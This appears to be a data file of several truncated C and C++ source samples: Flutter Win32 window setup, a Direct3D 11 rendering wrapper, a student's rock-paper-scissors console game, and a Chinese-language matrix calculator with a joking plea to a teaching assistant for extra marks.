scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"d3d11.h\"\n#include \"../../window/window.h\"\n\nstatic Window* window = Window::GetSingleton();\n\nD3D11* D3D11::GetSingleton()\n{\n\tstatic D3D11 d3d11;\n\treturn &d3d11;\n}\nbool D3D11::Create(UINT width, UINT height)\n{\n    DXGI_SWAP_CHAIN_DESC sd;\n    ZeroMemory(&sd, sizeof(sd));\n    sd.BufferCount = 2;\n    sd.BufferDesc.Width = width;\n    sd.BufferDesc.Height = height;\n    sd.BufferDesc.Format = format;\n    sd.BufferDesc.RefreshRate.Numerator = 60;\n    sd.BufferDesc.RefreshRate.Denominator = 1;\n    sd.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\n    sd.OutputWindow = window->GetHandle();\n    sd.SampleDesc.Count = 1;\n    sd.SampleDesc.Quality = 0;\n    sd.Windowed = TRUE;\n    sd.SwapEffect = swapEffect;\n\n    UINT flags = 0;\n#if defined(_DEBUG)\n    flags |= D3D11_CREATE_DEVICE_DEBUG;\n#endif\n\n    if (FAILED(D3D11CreateDeviceAndSwapChain(NULL, \n                                             driverType, \n                                             NULL, \n                                             flags,\n                                             NULL, \n                                             NULL,\n                                             D3D11_SDK_VERSION, \n                                             &sd,\n                                             swapChain.GetAddressOf(),\n                                             device.GetAddressOf(),\n                                             &featureLevel,\n                                             deviceContext.GetAddressOf())))\n        return false;\n\n    if (!CreateRenderTargetView())\n        return false;\n\n    if (!CreateDepthStencilView(width, height))\n        return false;\n\n    return true;\n}\nvoid D3D11::Release()\n{\n    if (swapChain) swapChain->Release();\n    if (device) device->Release();\n    if (deviceContext) deviceContext->Release();\n    if (renderTargetView) renderTargetView->Release();\n    if (depthStencilView) depthStencilView->Release();\n}\nbool D3D11::CreateRenderTargetView()\n{\n    ID3D11Texture2D* texture = nullptr;\n    if (FAILED(swapChain->GetBuffer(0, __uuidof(ID3D11Texture2D), (void**)&texture)))\n        return false;\n\n    if (FAILED(device->CreateRenderTargetView(texture, NULL, renderTargetView.GetAddressOf())))\n        return false;\n\n    texture->Release();\n    return true;\n}\nbool D3D11::CreateDepthStencilView(UINT width, UINT height)\n{\n    D3D11_TEXTURE2D_DESC descDepth;\n    ZeroMemory(&descDepth, sizeof(D3D11_TEXTURE2D_DESC));\n    descDepth.Width = width;\n    descDepth.Height = height;\n    descDepth.MipLevels = 1;\n    descDepth.ArraySize = 1;\n    descDepth.Format = DXGI_FORMAT_D24_UNORM_S8_UINT;\n    descDepth.SampleDesc.Count = 1;\n    descDepth.SampleDesc.Quality = 0;\n    descDepth.Usage = D3D11_USAGE_DEFAULT;\n    descDepth.BindFlags = D3D11_BIND_DEPTH_STENCIL;\n    descDepth.CPUAccessFlags = 0;\n    descDepth.MiscFlags = 0;\n\n    ID3D11Texture2D* texture = nullptr;\n    if (FAILED(device->CreateTexture2D(&descDepth, NULL, &texture)))\n        return false;\n\n    D3D11_DEPTH_STENCIL_VIEW_DESC descDSV;\n    ZeroMemory(&descDSV, sizeof(D3D11_DEPTH_STENCIL_VIEW_DESC));\n    descDSV.Format = descDepth.Format;\n    descDSV.ViewDimension = D3D11_DSV_DIMENSION_TEXTURE2D;\n    descDSV.Texture2D.MipSlice = 0;\n\n    if (FAILED(device->CreateDepthStencilView(texture, &descDSV, depthStencilView.GetAddressOf())))\n        return false;\n\n    texture->Release();\n    return true;\n}\nvoid D3D11::ClearRenderTarget(float r, float g, float b, float a)\n{\n    float clear_color[4] = { r, g, b, a };\n    deviceContext->ClearRenderTargetView(renderTargetView.Get(), clear_color);\n    deviceContext->ClearDepthStencilView(depthStencilView.Get(), D3D11_CLEAR_DEPTH, 1.0f, 0);\n}\nvoid D3D11::SetRenderTarget()\n{\n    deviceContext->OMSetRenderTargets(1, renderTargetView.GetAddressOf(), depthStencilView.Get());\n}\nbool D3D11::ResizeBuffer(UINT width, UINT height)\n{\n    deviceContext->OMSetRenderTargets(0, NULL, NULL);\n    if (renderTargetView) renderTargetView->Release();\n    if (depthStencilView) depthStencilView->Release();\n\n    if (FAILED(swapChain->ResizeBuffers(0, width, height, DXGI_FORMAT_UNKNOWN, 0)))\n        return false;\n\n    if (!CreateRenderTargetView())\n        return false;\n\n    if (!CreateDepthStencilView(width, height))\n        return false;\n\n    return true;\n}\nvoid D3D11::SetViewport(UINT width, UINT height)\n{\n    D3D11_VIEWPORT vp;\n    vp.Width = (FLOAT)width;\n    vp.Height = (FLOAT)height;\n    vp.MinDepth = 0.0f;\n    vp.MaxDepth = 1.0f;\n    vp.TopLeftX = 0;\n    vp.TopLeftY = 0;\n    deviceContext->RSSetViewports(1, &vp);\n}\nvoid D3D11::Present(bool vsync)\n{\n    swapChain->Present(vsync ? 1 : 0, 0);\n}\nvoid D3D11::SetPrimitiveTopology(PrimitiveTopology primitiveTopology)\n{\n    if (primitiveTopology == PT_TRIANGLELIST)\n        deviceContext->IASetPrimitiveTopology(D3D11_PRIMITIVE_TOPOLOGY_TRIANGLELIST);\n    else if (primitiveTopology == PT_LINELIST)\n        deviceContext->IASetPrimitiveTopology(D3D11_PRIMITIVE_TOPOLOGY_LINELIST);\n    else printf(\"primitive topology",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "\ufeff#include \"header.h\"\r\n#include <cstdlib>\r\n#include <windows.h>\r\n\r\nPlayer user;\r\nPlayer computer;\r\n\r\nvoid Player::addWins() {\r\n\tthis->wins++;\r\n}\r\n\r\nint Player::checkWins() {\r\n\treturn this->wins;\r\n}\r\n\r\nvoid Game::mainMenu() {\r\n\tcout << \"\\n\\t ~ Rock Paper Scrissors ~ \\n \\t\\t\\tBy Popescu Paul\\n\\n \";\r\n\t\r\n\tcout << \"\\t\\t1. Play\\n\\t\\t2. Credits\\n\\t\\t3. Exit\";\r\n\tint choice;\r\n\tcout << \"\\n\\n\\t Choice: \"; cin >> choice;\r\n\tswitch (choice) {\r\n\tcase 1:\r\n\t\tstartGame();\r\n\t\tbreak;\r\n\tcase 2:\r\n\t\tcredits();\r\n\t\tbreak;\r\n\tcase 3:\r\n\t\tcout << \"\\n\\t Exiting...\";\r\n\t\tSleep(2000);\r\n\t\tbreak;\r\n\tdefault:\r\n\t\tcout << \" Choice not available.\";\r\n\t\tbreak;\r\n\t}\r\n}\r\n\r\n\r\nvoid Game::startGame() {\r\n\tmaxWins = 0;\r\n\tcout << \"\\n How many games until game over? \\n \\t 3    5    7\\n\\n\\tChoice: \";\r\n\tint choice; cin >> choice;\r\n\tmaxWins = choice; cout << \"\\n You've chosen \" << maxWins << \" maximum wins needed.\";\r\n\tcout << \"\\n\\n\\t Game starting...\";\r\n\tSleep(3000);\r\n\tsystem(\"CLS\");\r\n\tRPSGame();\r\n}\r\n\r\nvoid Game::RPSGame() {\r\n\tsrand((unsigned)time(NULL));\r\n\r\n\twhile(user.wins < maxWins || computer.wins < maxWins) {\r\n\t\tcout << \"\\n\\n\\tMake your choice: \";\r\n\t\tcout << \"\\n 1. Rock \\n 2. Paper \\n 3. Scrissors \\n \\n \\t Choice: \";\r\n\r\n\t\t/*\r\n\t\tthe choices are:\r\n\t\t1. rock\r\n\t\t2. paper\r\n\t\t3. scrissors\r\n\t\t*/\r\n\r\n\t\tint choice; \r\n\t\tdo\r\n\t\t\tcin >> choice;\r\n\t\twhile (choice != (int)choice);\r\n\t\tcout << \"\\n\\t You chose: \\n\";\r\n\t\tswitch (choice) {\r\n\t\tcase 1:\r\n\t\t\trock();\r\n\t\t\tbreak;\r\n\t\tcase 2:\r\n\t\t\tpaper();\r\n\t\t\tbreak;\r\n\t\tcase 3:\r\n\t\t\tscissors();\r\n\t\t\tbreak;\r\n\t\tdefault:\r\n\t\t\tcout << \"Choice not available.\";\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tint computer_choice = rand() % 3 + 1;\r\n\r\n\t\tcout << \"\\n\\n\\t Computer chose: \\n\\n\";\r\n\t\tif (computer_choice == 1) {\r\n\t\t\trock();\r\n\t\t\tif (choice == 3) {\r\n\t\t\t\tcout << \"\\n\\n\\t Computer wins!\\n\";\r\n\t\t\t\tcomputer.addWins();\r\n\t\t\t}\r\n\t\t\telse if (choice == 2) {\r\n\t\t\t\tcout << \"\\n\\n\\t User wins!\\n\";\r\n\t\t\t\tuser.addWins();\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t\tcout << \"\\n Draw! Go again.\";\r\n\t\t\tcheckEndGame();\r\n\t\t\tSleep(1250);\r\n\t\t\tsystem(\"CLS\");\r\n\t\t}\r\n\t\telse if (computer_choice == 2) {\r\n\t\t\tpaper();\r\n\t\t\tif (choice == 1) {\r\n\t\t\t\tcout << \"\\n\\n\\t Computer wins!\\n\";\r\n\t\t\t\tcomputer.addWins();\r\n\t\t\t}\r\n\t\t\telse if (choice == 3) {\r\n\t\t\t\tcout << \"\\n\\n\\t User wins!\\n\";\r\n\t\t\t\tuser.addWins();\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t\tcout << \"\\n Draw! Go again.\";\r\n\t\t\tcheckEndGame();\r\n\t\t\tSleep(1250);\r\n\t\t\tsystem(\"CLS\");\r\n\t\t}\r\n\t\telse if (computer_choice == 3) {\r\n\t\t\tscissors();\r\n\t\t\tif (choice == 2) {\r\n\t\t\t\tcout << \"\\n\\n\\t Computer wins!\\n\";\r\n\t\t\t\tcomputer.addWins();\r\n\t\t\t}\r\n\t\t\telse if (choice == 1) {\r\n\t\t\t\tcout << \"\\n\\n\\t User wins!\\n\";\r\n\t\t\t\tuser.addWins();\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t\tcout << \"\\n Draw! Go again.\";\r\n\t\t\tcheckEndGame();\r\n\t\t\tSleep(1250);\r\n\t\t\tsystem(\"CLS\");\r\n\t\t}\r\n\t}\r\n\treturn;\r\n}\r\n\r\n\r\nvoid Game::credits() {\r\n\tsystem(\"cls\");\r\n\tcout << \"\\n\\n\\n\\t\\tGame by Popescu Paul\\n\";\r\n\tcout << \"\\t      2nd Year Student - Math UAIC\\n\\n\";\r\n\tcout << \"\\t\\tThank you for playing!   \\n\\n\\n\\n\";\r\n\tSleep(5000);\r\n\tsystem(\"cls\");\r\n\tmainMenu();\r\n\t//may add more\r\n}\r\n\r\n\r\nvoid Game::checkEndGame() {\r\n\tint winsU = user.checkWins();\r\n\tint winsC = computer.checkWins();\r\n\tif (winsU == maxWins) {\r\n\t\tcout << \"User WINS!\\nGame closing...\";\r\n\t\tSleep(2000);\r\n\t\texit(0);\r\n\t}\r\n\telse if (winsC == maxWins){\r\n\t\tcout << \"Computer WINS!\\nGame closing...\";\r\n\t\tSleep(2000);\r\n\t\texit(0);\r\n\t}\r\n}\r\n\r\nint main() {\r\n\tsystem(\"color E0\");\r\n\r\n\tGame game;\r\n\tgame.mainMenu();\r\n\treturn 0;\r\n}",
    "#include<stdio.h>\r\n#include<math.h>\r\n#include<stdlib.h>//\u5934\u6587\u4ef6 \r\nint i,j,m,n,p,q,k,x,y,order;//\r\nfloat result=0.0; //\u884c\u5217\u5f0f\u7ed3\u679c \r\nfloat determinant(float **a,int order);//\u884c\u5217\u5f0f\u51fd\u6570 \r\nfloat laplace(float **a,int r,int c,int order);//\u62c9\u666e\u62c9\u65af\u5c55\u5f00\u51fd\u6570 \r\nfloat inverse(float **a,int r,int c,int order); //\u9006\u77e9\u9635\u51fd\u6570 \r\nvoid print_inverse(float **a,int order);//\u8f93\u51fa\u9006\u77e9\u9635\u51fd\u6570 \r\nfloat adjoint(float **a,int r,int c,int order);//\u4f34\u968f\u77e9\u9635\u51fd\u6570 \r\nvoid print_adjoint(float **a,int order);//\u8f93\u51fa\u4f34\u968f\u77e9\u9635\u51fd\u6570 \r\nint main()\r\n{\r\n    printf(\"-----------------\u77e9\u9635\u8ba1\u7b97\u5668-----------------\\n\");\r\n    printf(\"------\u8bf7\u9009\u62e9\u529f\u80fd\uff1a\uff08\u9009\u62e9\u540e\u8bf7\u6309\u56de\u8f66\u952e\uff09  ----\\n\");\r\n    printf(\"------    0\uff1a\u9000\u51fa                -----------\\n\");\r\n    printf(\"------    1\uff1a\u8f6c\u7f6e\u77e9\u9635            -----------\\n\");\r\n    printf(\"------    2\uff1a\u77e9\u9635\u52a0\u6cd5            -----------\\n\");\r\n    printf(\"------    3\uff1a\u77e9\u9635\u4e58\u6cd5            -----------\\n\");\r\n    printf(\"------    4\uff1a\u77e9\u9635\u884c\u5217\u5f0f          -----------\\n\");\r\n    printf(\"------    5\uff1a\u9006\u77e9\u9635              -----------\\n\");\r\n    printf(\"------    6\uff1a\u4f34\u968f\u77e9\u9635            -----------\\n\");\r\n    printf(\"--------------------------------------------\\n\");//\u5934\u76ee \r\n    do\r\n    {\r\n    \tscanf(\"%d\",&x);//\u9009\u62e9\u9700\u8981\u8fdb\u884c\u7684\u529f\u80fd \r\n    \tswitch(x)\r\n    \t{\r\n    \t\tcase(0):\r\n\t\t\t{\r\n\t\t\t\tprintf(\"\\n\");\r\n    \t\t\tprintf(\"\u52a9\u6559\u522b\u5fd8\u4e86\u52a0\u5206\uff08\u4e00\u5b9a\u8981\u52a0\u5206\uff09\\n\"); \r\n    \t\t\tprintf(\"\u8bf7\u4ece0\u30011\u4e2d\u9009\u62e9\\n\");\r\n    \t\t\tprintf(\"0:\u5927\u6c14\u52a0\u5206\\n\");\r\n    \t\t\tprintf(\"1:\u5c31\u8fd9\uff1f\uff1f\uff1f\\n\");\r\n    \t\t\tdo\r\n\t\t\t\t{\r\n    \t\t\t  scanf(\"%d\",&y);\r\n    \t\t\t  switch(y) \r\n    \t\t\t  {\r\n    \t\t\t\t  case(0):\r\n    \t\t\t\t  {\r\n\t\t\t\t\t      printf(\"\\n\");\r\n    \t\t\t\t\t  printf(\"\u4e07\u5206\u611f\u8c22\uff0c\u52a9\u6559\u4f60\u6700\u597d\u770b\uff01  (\u70b9\u51fb\u4efb\u610f\u952e<\u522b\u70b9\u7535\u6e90\u952e\u3001num lock\u952e\u3001ctrl\u952e\u3001fn\u952e\u3001\u4e2d\u6587\u72b6\u6001\u4e0b\u7684\u5b57\u6bcd\u952e\u2026\u2026>\u9000\u51fa\u5594)\");\r\n\t\t\t\t\t  }\r\n\t\t\t\t\t  break;\r\n\t\t\t\t\t  case(1):\r\n\t\t\t\t\t  {\r\n\t\t\t\t\t\t  printf(\"\u5fd8\u4e86\u52a0\u5206\u5566 \uff08\u545c\u545c\u545c\u6ca1\u6709\u52a0\u5206  # __  #\uff09\\n\");\r\n\t\t\t\t\t\t  printf(\"\u8bf7\u518d\u6b21\u4ece0\u30011\u4e2d\u9009\u62e9\\n\");\r\n\t\t\t\t\t\t  printf(\"0\uff1a\u597d\u5427\u7ed9\u4f60\u52a0\u5206\\n\");\r\n\t\t\t\t\t\t  printf(\"1\uff1a\u5c31\u662f\u4e0d\u52a0\u5206\\n\");\r\n\t\t\t\t\t\t  printf(\"\\n\"); \r\n\t\t\t\t\t  }\r\n\t\t\t\t\t  break;\r\n\t\t\t\t  }\r\n\t\t\t    }\r\n\t\t\t    while(y);//\u5f53\u8f93\u51650\u65f6\u9000\u51fa\uff0c\u5426\u5219\u4e00\u76f4\u5faa\u73af \r\n\t\t    }\r\n\t\t\tbreak;\r\n\t\t\tcase(1):\r\n\t\t\t{\r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\\n\");\r\n\t\t\t\tscanf(\"%d%d\",&m,&n);\r\n\t\t\t\tfloat **a=(float**)malloc(sizeof(float*)*m);\r\n\t            int w;\r\n\t            for(w=0;w<m;w++)\r\n\t            a[w]=(float*)malloc(sizeof(float)*n);\r\n\t            float **b=(float**)malloc(sizeof(float*)*m);\r\n                for(w=0;w<m;w++)\r\n\t            b[w]=(float*)malloc(sizeof(float)*n);\r\n\t\t\t\twhile(m<=0||n<=0)//\u5224\u65ad\u662f\u5426\u5408\u6cd5 \r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"\u77e9\u9635\u4e0d\u5408\u6cd5\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\");\r\n\t\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\\n\");\r\n\t\t\t\t    scanf(\"%d%d\",&m,&n);\r\n\t\t\t\t} \r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635\uff1a\uff08\u8f93\u5165\u65f6\u6bcf\u4e2a\u6570\u7528\u7a7a\u683c\u9694\u5f00,\u8d85\u51fa\u77e9\u9635\u80fd\u5bb9\u7eb3\u7684\u6570\u5c06\u81ea\u52a8\u5ffd\u7565\uff09\\n\");\r\n\t\t\t\tfor(i=0;i<m;i++)//\u8f93\u5165 \r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            scanf(\"%f\",&a[i][j]);\r\n\t\t            }\r\n\t            }\r\n\t            for(i=0;i<m;i++)\r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            b[i][j]=a[j][i];\r\n\t\t            }\r\n\t            }\r\n\t            printf(\"\u8fd9\u662f\u8f6c\u7f6e\u77e9\u9635\uff1a\\n\");\r\n\t            for(i=0;i<m;i++)//\u8f93\u51fa \r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            printf(\"%.2f\\t\",b[i][j]);\r\n\t\t            }\r\n\t\t            printf(\"\\n\");\r\n               \t}\r\n               \tprintf(\"\\n\");\r\n               \tprintf(\"\u9009\u62e90\u9000\u51fa\uff0c\u6216\u9009\u62e9\u4e0b\u4e00\u4e2a\u60f3\u6267\u884c\u7684\u529f\u80fd\\n\"); \r\n\t\t\t}\r\n\t\t\tbreak;\r\n\t\t\tcase(2):\r\n\t\t\t{\r\n\t\t\t\tprintf(\"\u5728\u8fd9\u91cc\u8fdb\u884c\u77e9\u9635\u52a0\u6cd5\uff1a\\n\");\r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635a\u7684\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\");\r\n\t\t\t\tprintf(\"\\n\");\r\n\t\t\t\tscanf(\"%d%d\",&p,&q);\r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635b\u7684\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\");\r\n\t\t\t\tprintf(\"\\n\");\r\n\t\t\t\tscanf(\"%d%d\",&m,&n);\r\n\t\t\t\tfloat **a=(float**)malloc(sizeof(float*)*p);\r\n\t            int w;\r\n\t            for(w=0;w<p;w++)\r\n\t            a[w]=(float*)malloc(sizeof(float)*q);\r\n\t            float **b=(float**)malloc(sizeof(float*)*m);\r\n                for(w=0;w<m;w++)\r\n\t            b[w]=(float*)malloc(sizeof(float)*n);\r\n\t            float **c=(float**)malloc(sizeof(float*)*m);\r\n                for(w=0;w<m;w++)\r\n\t            c[w]=(float*)malloc(sizeof(float)*n);\r\n\t\t\t\twhile(p!=m||q!=n)//\u4e0d\u80fd\u76f8\u52a0\u91cd\u65b0\u8f93\u5165 \r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"\u8fd9\u4e24\u4e2a\u77e9\u9635\u4e0d\u80fd\u76f8\u52a0\u3002\\n\");\r\n\t\t\t\t\tprintf(\"\u8bf7\u91cd\u65b0\u8f93\u5165\u77e9\u9635b\u7684\u884c\u6570\u548c\u5217\u6570,\u4f7f\u4e4b\u4e0e\u77e9\u9635a\u7684\u884c\u6570\u5217\u6570\u4e00\u81f4\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\\n\");\r\n\t\t\t\t\tscanf(\"%d%d\",&m,&n);\r\n\t\t\t\t}\r\n\t\t\t\twhile(m<=0||n<=0||p<=0||q<=0)//\u5224\u65ad\u662f\u5426\u5408\u6cd5 \r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"\u77e9\u9635\u4e0d\u5408\u6cd5\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\");\r\n\t\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635a\u7684\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\\n\");\r\n\t\t\t\t    scanf(\"%d%d\",&p,&q);\r\n\t\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635b\u7684\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\\n\");\r\n\t\t\t\t    scanf(\"%d%d\",&m,&n);\r\n\t\t\t\t} \r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635a\uff08\u8f93\u5165\u65f6\u6bcf\u4e2a\u6570\u7528\u7a7a\u683c\u9694\u5f00,\u8d85\u51fa\u77e9\u9635\u80fd\u5bb9\u7eb3\u7684\u6570\u5c06\u81ea\u52a8\u5ffd\u7565\uff09\uff1a\\n\");\r\n\t\t\t\tfor(i=0;i<p;i++)//\u8f93\u5165 \r\n\t            {\r\n\t\t            